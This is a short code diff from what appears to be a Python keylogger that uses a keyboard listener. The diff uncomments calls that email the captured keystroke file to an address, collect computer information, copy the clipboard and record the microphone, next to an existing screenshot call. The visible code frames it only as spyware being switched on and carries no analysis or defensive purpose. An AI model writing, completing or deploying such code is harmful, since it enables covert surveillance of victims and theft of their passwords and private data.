@@ -148,8 +148,8 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-# send_email(key_information, file_path + extend + key_information, toaddr)
-# computer_information()
-# copy_clipboard()
-# microphone()
+send_email(key_information, file_path + extend + key_information, toaddr)
+computer_information()
+copy_clipboard()
+microphone()
 screenshot()
